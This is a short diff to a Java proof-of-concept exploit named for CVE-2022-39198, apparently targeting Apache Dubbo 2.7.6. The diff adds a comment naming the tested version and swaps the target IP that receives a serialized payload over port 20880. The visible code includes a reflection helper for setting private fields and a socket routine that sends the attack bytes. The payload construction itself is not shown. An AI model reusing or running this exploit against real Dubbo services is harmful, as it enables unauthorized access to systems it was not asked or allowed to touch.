@@ -21,7 +21,11 @@ import java.net.Socket;
 import java.util.HashMap;
 import java.util.Random;
 
+/**
+ * 测试版本 dubbo 2.7.6
+ */
 public class CVE_2022_39198 {
+
     public static void setFieldValue(Object obj, String filedName, Object value) throws NoSuchFieldException, IllegalAccessException {
         Field declaredField = obj.getClass().getDeclaredField(filedName);
         declaredField.setAccessible(true);
@@ -99,7 +103,7 @@ public class CVE_2022_39198 {
 
             byte[] bytes = dubbo_data.toByteArray();
             //todo 此处填写Dubbo服务地址及端口
-            Socket socket = new Socket("192.168.26.164", 20880);
+            Socket socket = new Socket("10.58.120.200", 20880);
             OutputStream outputStream = socket.getOutputStream();
             outputStream.write(bytes);
             outputStream.flush();
